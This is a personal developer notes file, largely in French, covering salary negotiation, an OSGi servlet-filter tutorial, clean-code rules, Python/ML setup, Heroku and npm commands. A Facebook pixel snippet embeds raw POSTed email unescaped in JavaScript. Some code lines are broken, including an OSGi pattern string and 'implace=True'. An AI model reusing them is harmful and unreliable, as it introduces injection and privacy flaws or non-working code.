(?=.*spring)(?=.*test)
Rule à faire : 
    refaire crossing-covariant mais cette fois les tags * et + et 0/* sont sur les instances! > difficile
Canvas :
    permettre qu'on voit meme les titres longs
    Permettre de pouvoir bouger les rectangles
arbre : 
    filtrage de l'arbre + copier-coller + drag/nDrop
    Edition des costs des components
sku p-aw15tp4-89
948194935 

AFAIRE:
a lire : https://stackoverflow.com/questions/3216780/problem-reloading-a-jar-using-urlclassloader
<script>
function facebookpixelRegister(){
  fbq('track', 'CompleteRegistration', {
    value: {$smarty.post.email},
  });
}
</script>
facebook : 
       https://developers.facebook.com/docs/marketing-api/dynamic-product-ads/product-audiences#setuppixel

Negociation salaire : 
  pas depasser un plafond (a definir) ceux qui sont comme moi ont quel salaire?
  qui est-il?
  preparer docs (mails) materiels (ce qu'on dit les autres)
  Le remercier de m'accorder du temps
  mise en avant de ce que j'ai fait sans dénigrer les autres (pas victime!) Ne jamais se comparer aux autres
  m'entrainer oralement (doit etre + dur que le combat)
  2 ou 3 arguments max (en %age) Une augmentation de 3% c'est raisonnable. Investissement, ponctualité, serieux
  prendre un RDV surprise: "J'ai besoin d'avoir un entretien(ne pas dire pourquoi. "un petit bilan"). A quel moment est ce dispo ?" Refuser les proposition de RDV entre 2 portes à la vavite: "je prefere prendre du temps 30min minimum: ce n'est pas urgent" Quand il est bien.
  je sais que vous êtes très sollicité mais sans réponse je vous resolliciterais car pour moi c important
  ne pas attendre evaluation annuelle. Le faire quand le bilan de santé de l'entreprise est OK (voir site de l'entreprise, partenaires sociaux)
  pas faire comme tout le monde.
  penser en quoi mon patron est gagnant. gagnant gagnant. j'aime cette entreprise. Veut y rester.
  En dernier recours si marche pas: voir si ca peut etre autre-chose que de l'argent? 
  Si KO ne pas montrer ma deception. Pensez-y on en reparlera plus tard. 
Servlet filters are an important component of web application and it can be used in different scenarios, e.g.: 
1) Authenticating requests (ServletRequest) before delegating them to your actual business class (Servlet/Controller). 
2) Formatting request (ServletRequest) and response data (ServletResponse) 
3) Global/Application level Error handling 
There are many more uses cases where we can use Servlet filters. 
A traditional web application is composed of couple of Business classes & data (model), JSP (views), controllers/servlets and few other resources like css, images etc. All these components are packaged as a WAR file and we deploy it on a web/application server. To add/configure a servlet filter in traditional web application we user web.xml configuration file and tag as: 
  springSecurityFilterChain
  org.springframework.web.filter.DelegatingFilterProxy
     springSecurityFilterChain
     /*
     REQUEST
     ERROR
An OSGi web application is different as compared to traditional web applications. Below are few major differences: 
1) Traditional web applications are deployed on web/application server and run under a servlet container whereas OSGi web application are deployed in an OSGi container that has servlet container as an OSGi HTTP service. 
2) In traditional web application required libraries/jars are part of WAR file whereas in OSGi web application jar files are installed as OSGi bundles in OSGi container. 
3) In traditional web application Filter are configured using web application whereas in OSGi web application Filter are configured/registered using OSGi HTTP service. 
As I mentioned, in OSGi web application we don’t configure filters in web.xml file rather we need to register it through OSGi HTTP service, there are two different ways to do this: 
1) Create a Filter and register it as an OSGi service in to OSGi HTTP service (ExtHttpService) 
2) Create a Filter and make it as an OSGi component (Whiteboard method) 
In this post we are going to create a simple filter to encode all request parameters using UTF-8 encoding before passing that request to a servlet/controller. We have used this concept in Adobe/Day CQ5 that uses Apache Felix as OSGi framework for managing OSGi components and services. 
1) Create a Filter and register it to OSGi HTTP service 
a) Create a class that implements javax.servlet.Filter and add you logic to doFilter() method. Also, if required implement the init() and destroy() to do some initialization and cleanup activities. 
public class CharacterEncodingFilter implements Filter {
 private String encoding = "UTF-8";
 private Boolean forceEncoding = true;
 public void init(FilterConfig filterConfig) throws ServletException {
  try {
   String encoding = filterConfig.getInitParameter("init.charencoding.filter.encoding");
   if(encoding != null && encoding.trim().length() >0) {
    this.encoding = encoding;
   }
   if(filterConfig.getInitParameter("init.charencoding.filter.forceencoding") != null) {
    Boolean forceEncoding = Boolean.parseBoolean(
      filterConfig.getInitParameter("init.charencoding.filter.forceencoding"));
    this.forceEncoding = forceEncoding;
   }
  } catch (Exception ex) {
   ex.printStackTrace();
  }
 }
 public void doFilter(ServletRequest request, ServletResponse response, 
   FilterChain chain) throws IOException, ServletException {
  ExtraParamWrappedRequest reqwrapper = new ExtraParamWrappedRequest((HttpServletRequest) request, null);
  if (this.encoding != null && (this.forceEncoding || request.getCharacterEncoding() == null)) {
   Map additionalParams = new HashMap();
   additionalParams.put("_charset_", new String[]{encoding});
   reqwrapper = new ExtraParamWrappedRequest((HttpServletRequest) request, additionalParams);
   reqwrapper.setCharacterEncoding(this.encoding);
   if (this.forceEncoding) {
    response.setCharacterEncoding(this.encoding);
   }
  }
  chain.doFilter(reqwrapper, response);
 }
 public void destroy() {
  // TODO Auto-generated method stub
 }
 class ExtraParamWrappedRequest extends HttpServletRequestWrapper {
  private final Map modifiableParameters;
  private Map allParameters = null;
  public ExtraParamWrappedRequest(final HttpServletRequest request, final Map additionalParams) {
   super(request);
   modifiableParameters = new TreeMap();
   if(additionalParams != null) {
    modifiableParameters.putAll(additionalParams);
   }
  }
  @Override
  public String getParameter(final String name) {
   String strings = getRequest().getParameter(name);
   if (strings != null)  {
    return strings;
   }
   return null;
  }
  @SuppressWarnings("unchecked")
  @Override
  public Map getParameterMap() {
   if (allParameters == null) {
    allParameters = new TreeMap();
    allParameters.putAll(super.getParameterMap());
    allParameters.putAll(modifiableParameters);
   }
   return Collections.unmodifiableMap(allParameters);
  }
  @Override
  public Enumeration getParameterNames() {
   return Collections.enumeration(getParameterMap().keySet());
  }
  @Override
  public String[] getParameterValues(final String name) {
   return getParameterMap().get(name);
  }
 }
}
b) Every OSGi bundle has an Activator class, we need to register the filter that we have created in step (a) to OSGi HTTP service in our Activator class by getting the reference of HTTP service (ExtHttpService). 
public class Activator implements BundleActivator {
 private static final Logger log = LoggerFactory.getLogger(Activator.class);
 public void start(BundleContext context) throws Exception {
  ServiceReference sRef = context.getServiceReference(ExtHttpService.class.getName());
  if (sRef != null) {
   Dictionary properties = new Hashtable();
   properties.put("service.pid", CharacterEncodingFilter.class.getName());
   properties.put("init.charencoding.filter.encoding", "UTF-8");
   properties.put("init.charencoding.filter.forceencoding", "true");
   ExtHttpService service = (ExtHttpService) context.getService(sRef);
   service.registerFilter(new CharacterEncodingFilter(), "/.*", properties, 0, null);
  }
 }
 public void stop(BundleContext context) throws Exception {
  System.out.println(context.getBundle().getSymbolicName() + " stopped");
 }
}
2) Create a Filter and make it as an OSGi component 
Second method of registering a filter to OSGi container is, creating it as a OSGi component/service. Below are the steps that we need to follow: 
a) Create a class that implements javax.servlet.Filter and add you logic to doFilter() method. Also, if required implement the init() and destroy() to do some initialization and cleanup activities. Basically, we can use the same class (CharacterEncodingFilter) that we have created above, the only difference we have in this method is the way of registering a filter. 
b) Get hold of OSGi bundle context and register filter as a service as shown below: 
public class Activator implements BundleActivator {
 private ServiceRegistration registration;
 public void start(BundleContext context) throws Exception {
  Hashtable props = new Hashtable();
  props.put("pattern", /.*");
    props.put("init.message", "Character encoding filter!");
  props.put("service.ranking", "1");
  this.registration = context.registerService(Filter.class.getName(), new CharacterEncodingFilter (), props);
 }
 public void stop(BundleContext context) throws Exception {
  this.registration.unregister();
 }
}
We have seen two different ways of registering filter for a web application that is running under OSGi container so, what’s the difference between these two methods? 
An OSGi container may contain multiple OSGi web application and each web application runs under its own bundle context. HTTP service is the service that manages HTTP request/response for all web application deployed under an OSGi container. First method registers filter at HTTP service level (global) and is applied to all request/response across all web application deployed in an OSGi container whereas second method registers a filter at bundle (individual web application) level and gets only executed only when a request is for that particular application/bundle. When we have multiple filters, they can be positioned based on need (which one to execute first and after that and so on) at HTTP service (fourth argument of service.registerFilter method) and individual application bundle level (service.ranking property). 
I hope this will help you to understand how Servlets filters works in OSGi enabled web applications. 
References: 
http://felix.apache.org/site/apache-felix-http-service.html 
http://www.eclipse.org/equinox/server/ 
-----------------------------



cleancoding : clean coding :LA SEULE FACON D ALLER VITE C EST D ALLER CLEAN ignorance is no excuse. No divided devs(frontetback = meme pers) expose your ignorance to learn. (its not weakness) 
0: 20 minutes de tomate tomatoes*18-20/jours(4pauses2m,1pause10m). https://tomato-timer.com/ pour partager: https://www.marinaratimer.com  Sous pression, se coller à la discipline ne pas être tenté de la bypasser
1. I will not produce harmful code
    - I will not release a defect
    - I will not make code for others harder to understand or change (soft-ware, easy to change).
            write crap , then clean en testant.
             uneFonction fait 1 seul truc (testable). taille methode tient dans la page (mais surtout fait u1 seul truc). Nom des fonctions et variables avec un sens(en lien avec le business)) quand necessaire. eviter iterators i et j et les strxxx. Sauf si l'utilisation est immediate après la creation alors le nom peut etre super court.
                              |_cad il n'est plus possible d'extraire(refactor) une autre fonction dans la fonction parente : extractTilYouDrop a faire. Dans ce cas chaque fonction n'a qu'une indentation, chaque if, else, while etc n'ont qu'une ligne dedans. Si impossible refactorer car methode doit retourner plusieurs variables: creer une classe avec ses variables dedans MAIS attention ma classe est statefull donc c vraiment a faire en dernier recours
             ne pasupdater l'argument objet dans la fonction mais faire des returns. et ne pas retourner de code (d'erreur)
             methodes ne renvoient pas null ni codes (-1) mais exception typee avec msg dedans ou un optional optionnal) (voir LINKjajsdfliuaerOpt)
             Command-Query separation: Soit une methode change un state quelquepart( dans la classe ou la base etc...)=sideEffect soit elle return une value=Query mais ne fait pas les deux en meme temps. (comme pour GET et POST)
                            identifier dans une methode les blocks "SideEffect" et les blocks "Query" 
             ne pas passer null ni boolean a methode (car ça veut dire que la fonction fait deux choses != avec un if dedans): si besoin virer ce param et faire autre methode(qui peut appeler la premiere). 3 args max à une methode(pour que cerveau n'aie pas à gérer ordre) Si pas possible créer bean rempli comme argument.
             ConditionIf parle mieux avec nom methode plutot que boolean. ou boolean ayant un sens. Rempalcer les if par méthodes. Preferer polymorphisme à switch-case ou plusieurs ifs: les conditions sont déplacées dans une factory(new et if dedans)
             Nom variable:15charmax. taille est proportionelle au scope ou elle est: nom variable globale: tres long. nom dans methode tres petite : tres petit nom                              
             Ne pas melanger hight levelniveau, middle levelniveau et low levelniveau contexts (BusinessObject/StringBuffer). Interieur d'une fonction a un niveau sous le nom de cette fonction. WikiPage(hight concept) et StringBuffer(low concept) n'ont pas à se retrouver dans une même methode 
             nom de classe : si une classe n'est pas nomable c qu'elle fait trop de choses.
             commentairers: le code doit parler de lui meme. ne commenter que les @c, ref., pas du vieux code et pas un journal(c pour le repo), poukoi comme ca/business need, TODO mais a virer et regler
             une url ne doit pas contenir d'ID. c'est un ID pour l'URL et les deux ID(metier/url) doivent être indépendants
              SingleResponsabilityPrinciple=CommonClosurePrinciple:grouper(en usecase) ce qui change ensemble-separer ce qui change pour differentes raisons (usecases). Séparer les fichiers/classes/code par QUI va demander les modifs(le DEV, le Design, le Client). Ne pas mettre de logique dans un template html. LINKusecase. Ne pas utiliser les id de la base de donnée comme id dans les liens href: prevoir un champisolé pour les liens. Séparer les controllers(en lien avec monde exterieur) des UserCases(algo pur metier)
              OpenClosePrinciple: ouvert à l'extention et fermé au changement
              Liskov'sSubstitutionPrinciple : A-parentde->B alors B doit être cohérent avec toutes les methodes et proprietes de A. A ne doit pas proposer des choses que B ne pourra pas faire. B peut faire tout ce que A fait mais à sa façon. Il faut que instances de B puisse prendre la place de instances de A sans problème. LSP est cassé si ya des if sur les types. Donc préférer la Composition à l'héritage: ne plus faire d'heritage: annimal->chien mais bouge->nage->coule voir plus bas prototype LINKpptypeksdf
              InterfaceSegregationPrinciple: faire plusieurs petites interfaces plutot qu'une grande pour qu'il n'y ait pas de methodes qui servent à rien pour certaines classes implementantes (Composition over heritage) :un DAO ne doit pas traverser transversallement de la DB vers l'UI
              DependencyInjectionPrinciple: eviter de faire new X() dans une classe pour ne pas être dependant de X: utiliser les interfaces
              Demeter=DontTalkToStrangers(PourUneClasse): a.toto(x).titi(y).tata()INTERDIT! Faire: a.tata(): chaque methode ne doit servir qu'a faire UN truc et doit avoir son test(petit). Decoupler! Le moins de dependance possible. si on peut pas eviter passer par interface et non par classe. ne pas faire "new classeA" dans "classeB"
                                                                                   |_utiliser plutot des variables intermediaires
              kiss : keep it simple stupid                             
              Packaging: ne pas mettre dans un meme package des classes qui seront dans des composants (jars) differents...(?... a clarifier)
              si le client est impliqué utiliser cucumber ou fitnesse
              faire de l'integration continue sauf si le projet est tout petit
              yagni : you ain't gonna need it
              dry : don't repeat yourself : each peace of knowledge leaves in one place. Pas duplication de code ni d'effort(fait meme chose d'une autre façon) MAIS interdit de faire extends heritage pour resoudre Dry. Alors Dry est toléré.
                    Extends ne doit servir que pour le design pattern strategie strategy(=template) 
             -Object objet: a variables privees et expose methodes pour modifier ces variables|_ca ne peut pas etre les deux en meme temps
            |
             -DataStructure : n'a pas de methode que des getters et setters publics ou variables publiques
             Ne pas gerer les exception: le thrower au niveau le plus haut
             Les classes constant doivent être des classes abstraites. (ne sont pas instanciables et l'implementation est incomplette et sert à ses classes derivees)
             UI n'a pas a etre tester (visuellement): il faut tester le Presenter(objet java)
             Entites n'ont pas de logique dedans sauf si une autre application va utiliser la logique: alors déporter la logique du usecase dans l'entity SEULEMENT si toutes les autres applis vont utiliser cette logique
             Pieges de perfs : performances : attention à requetes dans boucles (pb n+1)
                               attention à hibernate qui génère tout seul des requetes
                               mettre deux timestamp pour mesurer la durée écoulée entre les deux n'est pas suffisant. Il faut un outil pour mesurer derriere la durée du garbadge collector             
2. The code that I produce will always be my best work
   - I will not willingly release code that is defective either in behavior or structure
3. I will provide with each release a quick, sure and repeatable proof that every element of the code works as it is supposed to
   - Write tests
4. I will make frequent and small releases faire des small releases
5. I will fearlessly and relentlessly improve at any opportunity, will not make the code worse
6. I will keep productivity my own and my team high, I will do nothing that decreases that productivity
   - I will not damage the code, I will not make things worse
7. I will continuously ensure, that others can cover for me and that I can cover for them
8. I will produce estimates that are honest both in magnitude and precision, I will not make promises without certainty
9. I will never stop learning and improving my craft (I learn by myself). Ignorance is no excuse






scrum : management :
      Cynefin :Framework. "Bring in the bare minimum amount of process" 
          obvious: manager+planning... =orchestre: utiliser les best practices SOLID+TDD
          complicate: =orchestre
          complex: cercle de drums(experiences+tests+ecoute). Perfect execution may still lead to a failed project . Scrum permet de faire complex problm -> plusieurs complicate problms
          chaos: stop
     en options:
      planning game: simple---taches<kamban board(post-its)<stories+tasks+releases+storypoints---lourd : ca depend du projet et des equipes.
      tests clients: si client est engagé utiliser cucumber ou FitNess. Sinon alors faire un max de Tests unitaires
      small releases:OBLIGATOIRE
      proximité entre team ingenieurs techniques et le business: très préférable
      roulement des taches pour que chacun maîtrise tout+coding standards: LE PLUS POSSIBLE
      rythme durable: poser les limites de rythme: les projets sont des marathons. pas des sprints.
      ContinuousIntegration: OBLIGATOIRE mais un serveur de CI est necessaire que pour les gros projets.
      Pair Programming: Bonne pratique mais si certains ne fonctionnent pas bien comme ça alors mettre en place des revues de code. au moins 2 paires de yeux doivent voir le code
      Simple Design: designer que quand necessaire.
      Refactorer pour avoir du clean code.
      TDD: OBLIGATOIRE 
videos : 
  lightworks :
    couper: placer le in et le out puis le bouton juste a cote "delete the marked section"
    pour enregistrer exporter une vidéo : 
      tout en bas à gauche click droit sur All puis export puis youtube... (meme si c'est pas pour youtube choisir de ne pas envoyer directement sur youtube mais en local. Il créee un mp4)
pour enregistrer des videos films camera filmer tutoriels screen ecran :
  programme icecream sur windows (voir licence dans memopad)
  pour couper des videos trim utiliser vlc
    menu >vue>controles avances > utiliser le bouton rec > on retrouve les vidéos coupées dans le repertoire mes videos de windows

pour utiliser la mini camera potensic : 
    smartcamera
        
Python :
pour connaitre la version
    python -V ou python --version (version 2 cohabite avec version 3: python3 -V existe aussi)
voir la liste des mes modules : terminal > pip list    
si j'ai erreur ModuleNotFoundError: No module named 'keras.models'; 'keras' is not a package
  j'ai peut etre appelé mon fichier keras.py? faut pas
installer tensorflow:    pip est inclu dans python depuis version  Python 3.4 and Python 2.7.9 
  python -m pip install --upgrade https://storage.googleapis.com/tensorflow/mac/cpu/tensorflow-0.12.0-py3-none-any.whl
  installer keras : (si no module named keras) 
  (python -m )pip install keras
pour savoir ce que je peux installer avec pip: 
    python -c "from pip import pep425tags;print(pep425tags.supported_tags)"
        installer d'abord avec aptitude python-pip
        installer python3 et python3-pip (pip3 --version)
        pip3 install --user pipenv // installer pipenv (equivalent de nodejs pour python)
        connaitre le chemin vers le pythonvm: (a faire connecte a unix avec le bon user avec qui je veux bosser)
            python3 -m site --user-base // mettre le resultat de cette commande suivie de /bin dans ma variable d'environnement PATH de façon permanante
        installer python3-virtualenv (bof eviter de faire des env virtuels : Pycharm> setting > interpreter: prendre son path et le mettre dans mes variables d'environnement systeme. Redemarrer pycharm pour qu'il prenne en compte et que je puisse executer des commandes pip avec terminal pycharm)
        virtualenv --version // version de la virtual machine
        virtualenv -p python3 nomprojet //(-p python3 facultatif) créé un repertoire nomprojet avec dedans: bin;include;lib;pipselfcheck.json: c un environnement python indep. python a été copié dedans.
        entrer dans la vm: 
            source path/vers/monprojet/activate // des lors toutes les installs que je fais via pip ne se font que dans la vm et pas dans le python global
        dans la vm ou dans le repertoire de mon projet faire:
        >pip install requests // installe le packaage request dans les dependances de mon environnement; creer un fichier Pipfile
    creer un fichier toto.py
    executer un programme directement : 
        python3 test.py
    executer un programme avec la vm avec toutes les dependances dispo dans mon script:
        pipenv run python3 test.py
  programme python:
        import pandas as pd
        import Quandl
        import math
        df = Quandl.get('DES DONNEES') (c'est un tableau genre excel avec un entete)
        df=df[['ENTETE1','ENTETE2',...]] // redef les données avec que certaines colonnes de la totalite des colonnes
        df['MONTENTETECALCULE']=(df['ENTETEx']-df['ENTETEy']/etcetc) // je cree une nouvelle colonne calculee a partir des autres colonnes
        df.fillna(-99999,implace=True) // pour que quand ya pas de données dans une cellule je remplace par un chiffre quand meme// pas sûr.
        df['variableDuneColonnequequelqueslignesplusloin']=df['ENTETEx'].shift(-5)// 5 lignes avant (je crois)





AI : ia : intelligence artificielle : machine learning :
http://www.fast.ai/
https://www.youtube.com/channel/UCbfYPyITQ-7l4upoX8nvctg 
https://distill.pub/
calculatrice scientifique : https://www.desmos.com/calculators
supervised learning = training data (avec labels)
OHE = One Hot Encoding = data cathegorical = donnée non numérique à transformer en données numeriques
    [0,0,0,0,0,1,0,0,0,0] = 6
Mnist fourni du data
  nltk : (natural language)
      pip3 install nltk
optimizer met à jour les weight pendant entrainement-> loss minimization
objective function = loss function determine dans quels weight est appliqué optimizer
              MSE :1/n E i=1àn(Y'-Y)² donc plus je suis loin de la réalité plus le loss minimization est important
              binary cross entropy :  utilise logarithme: est bien pour des labels binaires (?...)
              categorical cross entropy : multiclass logaritmique (utilise par defaut avec sigmoid je crois)
metrics c'est pareil que objective function sauf que c pas utilisé pour l'entrainement mais pour le test              
      Accuracy = proportion de bonnes réponses
      Precision =combien de bonne réponses pour un multilabel
entrainement (model.fit(X_train,Y_train, batch_size=BATCH_SIZE,epochs=NB_EPOCH, verbose=VERBOSE,validation_split=VALIDATION_SPLIT))
    epoch = nombre de fois qu'on présente au model cette meme matrice de data: a chaque iteration les optimizers ajustent le weight
    batch_size = nombre d'instance d'entrainement observé avant que l'optimizer modifie les weights              
    validation_split = pour reserver une portion des data pour mesurer la performance pendant l'entrainement: a faire a chaque fois pour voir les choses
tester: on test sur des data jamais vu avant par la machine
  
  deepspeech :
      installer git lfs (large file storage) sert à ce que git gère les gros fichiers pas en local mais en remote
        deposer git-lfs-xx.tar.gz; executer le .sh dedans puis,
        >git lfs install
        >pip install https://index.taskcluster.net/v1/task/project.deepspeech.deepspeech.native_client.master.osx/artifacts/public/deepspeech-0.1.0-cp27-cp27m-macosx_10_10_x86_64.whl
         pip install https://index.taskcluster.net/v1/task/project.deepspeech.deepspeech.native_client.master.osx/artifacts/public/deepspeech-0.1.0-cp27-cp27m-macosx_10_10_x86_64.whl
         pip install unfichier.whl
                     https://pypi.python.org/packages/66/75/b10f120e4a6f9c045fb8c417af3f1e5a56fde163fdca3a75d87ec666c7bc/deepspeech-0.1.0-cp27-cp27mu-linux_armv7l.whl#md5=4312da2101abf486ec5c5c1a206281ce
         pip install https://pypi.python.org/packages/cc/6b/9cb53f7e6d91da9a1dc3b1335216ee6ff11e66d04d4e90b130149a806ce8/deepspeech-0.1.0-cp34-cp34m-manylinux1_x86_64.whl#md5=c99ace927019cab7a5bfbd01c693ac62
                                                                                                                          deepspeech-0.1.0-cp34-cp34m-manylinux1_x86_64.whl
         pip3.4 install https://pypi.python.org/packages/cc/6b/9cb53f7e6d91da9a1dc3b1335216ee6ff11e66d04d4e90b130149a806ce8/deepspeech-0.1.0-cp34-cp34m-manylinux1_x86_64.whl#md5=c99ace927019cab7a5bfbd01c693ac62
         pip3.4 install https://pypi.python.org/packages/3d/cc/8dfd3dcc50e2d5cb5e202532a71e868a58a28b2728266ecb57384afc7384/deepspeech-0.1.0-cp27-cp27m-macosx_10_12_x86_64.whl#md5=099e33d6c9c3a66dd707dc687efc4da4
        si erreur d'installation: essayer
            >pip install --verbose deepspeech            
        >pip list pour lister toutes mes dependances installees (le repository distant s'appelle pypi: https://pypi.python.org)
        >pip freeze > requirements.txt // cree un fichier requirement.txt qui est un snapshot de mes dependances
        >pip install -r requirements.txt // pour reinstaller ce qui est defini dans mon snapshot
              deactivate// pour quitter la vm sortir exit
              pour supprimer une vm: rm nomprojet(qui est un repertoire qui a été crée automatiqument voir cidessus)
        >pip install --upgrade unpackageaupgraderquiestdejainstalle

    Perceptron (existe MLP perceptron mutliple a plusieurs couches) 
        si f(x)>0 ->1
        si f(x)<0 ->0
        SANS demi mesure contrairement au :
    Activation fonctions: 
          . sigmoid = 1/(1+exp(-x)) la courbe en tre -inf et +inf forme un s entre 0 et 1 et si x=0 y=0.5 donc utilisé pour eviter le exaustive search = le facteur d'amélioration du backprop (qui modifie les weight) est trop grand et ça jump au hasard sans vraiment progressivement atteindre la perfection
          . ReLU        /
                       /
                _____0/    
    net est dense = pas de synapses supprimées elles existent toutes
                
chrome :
    exporter importer les flux d'echanges http avec fichier .har :
         existe extension chrome (http archive viewer)
    pour focuser trouver un element html par son xpath
      dans la console mettre : $x("//img/..\"sdfsdf\"...")
    alt+maj+p : screen capture totale
    ctr+shift+j ouvre panel puis ctr+shift+p  pour commandes
  pour pouvoir faire des tests en local sans cross-origin access probl:
    demarrer chrome avec "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" -allow-file-access-from-files
  faire des recherche d'elements dans la console: 
    onglet console saisir : $("laurent-moncompoentn1").shadowRoot.querySelector("h1") // n'utilise pas jquery mais c comme si.
Heroku :      https://devcenter.heroku.com/articles/getting-started-with-spring-mvc-hibernate
  git clone https://github.com/heroku/java-getting-started.git
   
  pour creer nouvelle app dans heroku. sans deployer pour l'instant
    cd monApp
    heroku create [nom de monApp optionel]
    il me dit que :
    l'url de mon app est : https://frozen-thicket-89622.herokuapp.com/
    et je pourrais alors recuperer mon app sur un autre local en faisant : git clone https://git.heroku.com/monApp.git (je crois)
      DEV:  pour utiliser base de donnee:         
              dans monapp/.env 
                  DATABASE_URL=postgres://localhost:5432/java_database_name  (accessible en java par  String connection = System.getenv().get("DATABASE_URL");LINK4488
                  UNEVARIABLEDENVIRONNEMENT=tototo
                 possible de setter une variable d'environnement à distance directement sans livrer!
                     heroku config:set MAVARIABLE="tititi"
                 voir les variables d'environnement sur le cloud :
                    heroku config //??? bof n'ecrit pas ce qu'il y a dans .env // je crois que .env c que pour local                                                                                          
            pour dire que c'est une appli web : Procfile (unix) et Procfile.windows
                web: java $JAVA_OPTS -jar target/dependency/jetty-runner.jar --port $PORT target/*.war
                ou
                web:    java -cp target/classes:target/dependency/* Main      // sera execute par un Dyno
           pour deployer directement un war existant dans mon app :
               heroku pluggin:install https://github.com/heroku/heroku-deploy // besoin de ce pluggin 
              heroku deploy:war --war monwar --app monappheroku          
  deployer mon app sur heroku:
      git push heroku master  
  pour savoir combien j'ai de dynos qui tournent sur mon app et combien ça coute :
      heroku ps
      pour forcer a un seul
        heroku ps:scale web=1 et à aucun : web=0 plus rien ne tourne.
  dans la demo mvnw sert juste à installer facilement maven sur son poste : mvnw clean install
  naviger sur mon app distante heberge chez heroku
      heroku open
  lire les logs
      heroku logs --tail
  demarrer l'application localement :
      mvn install (à faire avant!)
      heroku local:start (-f Profile.windows // optionnel mais pour indiquer de prendre ce fichier plutot)
        aller sur [localhost:5000](http://localhost:5000/).
  Deployer sur heroku:
       git add . //pour commiter dans mon git local ....???...
       git commit // va ouvrir vi pour que j'ecrive DIRECT mon commentaire
       git commit -m "blablamMonCommentaire" // et maintenant il faut ensuite deployer sur le cloud: 
       git push heroku master // comme avant.  
  ajouter un addon:
      heroku addons:create laddonQueJeVeuxAjouter
        exemple de addon gratuit. Souvent il demande la carte bleue grrr mais ceux si n'ont pas besoin 
      heroku addons:create herokuconnect:demo // sert à connecter avec Salesforce
         puis heroku addons:create monaddon -a <app name> ..???..
              heroku addons:open monaddon ..???..
              heroku addons:docs monaddon //DOC!
  lister mes addons
       heroku addons
  me connecter en bash au serveur distant unix // il cree un dyno pour ça mais invisible dans l'IHM heroku
      heroku run bash
  avoir des details sur la base de donnee utilisee
        heroku pg
  se connecter en java à la base de donnee
        DatabaseUrl.extract() method, which is made available via the heroku-jdbc dependency in the pom.xml, retrieves the DATABASE_URL environment variable, set by the database add-on, and establishes a connection.
  parametrer un domain : heroku>setting>domain  



  
nodejs : node.js : node : npm :  (https://www.npmjs.com/package tous les programmes sont là) : c'est le maven du javascript. A remplacé bower. Yarn fait pareil mais s'appuye sur npm. npm etait fait pour nodejs à la base
      defs : browserify : permet à des applis nodes (contiennent "require" car cote serveur require est comme import. mais browser interdit acces au filesystem) d'etres comprises par les browsers: il remplace "require par la concatenation des fichiers js dans un seul
            webpack fait comme browserify mais en plus avec plus de choses. voir LINKWPKCS
            babel converti du javascript recent pour les vieuw navigateurs voir LINKBBLE
si problemes dans npm : https://github.com/npm/npm/wiki/Troubleshooting
  installer npm:
   aller sur https://nodejs.org/en/download/ (downloader npm : sur internet)
  dans un repertoire faire
  (path/vers/npm)npm init // cree package.json là ou je suis// il me pause des questions pour bien le remplir ATTENTION pas d'espace dans le nom. l'important c'est le entry-point : indiquernomfichier.js qui est le point d'entree. je peux l'executer en faisant node indiquernomfichier.js
  afficher un module dispo sur le net:
      typings search --name react   ou typings search --name angular
 si je suis sous mon repertoire projet et je fais npm install: //-g pour installer dans le repository(globalement sur mon systeme) et non pas dans le projet; --save alors il ajoute la dependance "dependencies" dans le package.json où je suis. avec --save-dev il ajoute la dependance dans le package.json dans "devDependencies" et dans le repertoire qu'il cree node_modules ou je suis: c'est un package que j'installe qui ne sera utile que pour les tests de dev et non pas la prod 
        va installer toutes les dependances necessaire du projet (grace a package.json) dans mon repository npm
mettre à jour npm:// pour installer la derniere version
      npm install npm@latest -g 
installer un autre programme dans mon repository npm (en ajoutant -g)      
      npm install nomAutreProgramme@latest -g --save //-g pour qu'il l'installe dans mon repository npm et --save pour qu'il modifie mon package.json pour y ajouter cette dependance(uniquement, pas les dependancessousjacentes mais dans le repertoire node_modules si.)
      npm install nomAutreProgramme@^3.1.0 -g // pour installer une version specifique. Si je sais pas le num version mettre un num bidon il me proposera...                                                                                                                                                                     
      installer typescript
                npm install -g typescript (installe dans le repository npm)
              installer grunt :(equivalent de gulp en moins bien) // c'est un task runner: bof ne plus utiliser. Utiliser directement npm
                  npm install -g grunt-cli
              installer typescriptDefinitionManager TDM: 
                  npm install typings --global
                  d:\Profiles\lduverge\AppData\Roaming\npm\node_modules\typings\typings.json decrit les dependances
              installer angular-cli
                npm install -g angular-cli
faire rapidos un serveur http : 
      npm install -g live-server //(avant pourri : http-server) si pas deja fait : installe un ptit serveur sous repertoire de npm (watch- (pas reussi à le faire marcher)pour que ca rafraichit le cache du browser. sinon l'effacer  à la main. Est facultatif)
      puis :live-server ou npm run live-server // demarre un ptit serveur http pour servir là ou je suis (watch- pour que ca rafraichit à chaud. Est facultatif)   
  ancienne methode compiler le typescript:
      npm run tsc:w (compile en mode watch: si je modif le typescript il recompile à la volee)
      tsc nomfichier.ts compile un fichier typescript en fichier javascript// meme si il ya des erreurs il les ecrit mais cree un .js
  pour executer mon projet: me mettre à la racine de mon projet
      npm run build
  pour tester
      npm test // a faire dans mon projet ou bien C:\Users\lduverge\Desktop\node-v8.12.0-win-x64\npm test --scripts-prepend-node-path // si npm n'est pas defini dans le path windows Linktestjest
  package.json :
      {
  "name": "wenhuaduverge",
  "version": "1.0.0",
  "description": "About PrestaShop --------",
  "main": "nodeindex.js",
  "directories": {
    "doc": "docs"
  },
  "dependencies": {
    "purify-css": "^1.2.5"
  },
  "devDependencies": {},
  "scripts": {
    "start": "node index.js", // quand je ferais npm start il va executer node index.js donc node executera mon index.js à la racine du projet
    "test": "echo \"Error: no test specified\" && exit 1" // mettre "test":"jest" et là voir Linktestjest
     "build": "webpack --progress -p",    // quand je fais npm run build: lit webpack.config.js et execute webpack. Pour ne plus avoir besoin d'executer webpack à la main chaque fois que je veux builder et deployer mon projet npm
     "preinstall"ou "postinstall": xxxx ces deux la sont speciaux = triggers: s'executent avant et apres npm install.
     "moncul": "xxxxx" je peux alors definir "premoncul" et "postmoncul"
    "watch": "webpack --progress --watch" // npm run watch: rebuilde tout chaque fois que je touche à du javascript. Bof. live-server est mieux
             |_____va chercher sous monprojet/node_modules/webpack
      },         
  "author": "",
  "license": "ISC"
}

webpack : LINKWPKCS   
  npm install webpack --save-dev //installer webpack
  config à la racine du projet
  monprojet/webpack.config.js // Ce fichier s'execute quand on appelle ./node_modules/.bin/webpack
        module.exports = {
              entry: './index.js', // nom du fichier en entree qui a des dependances
              output: {
                filename: 'bundle.js' // nom du fichier en sortie
              },
              // POUR SUPPORTER BABEL
               module: {
                      rules: [
                        {
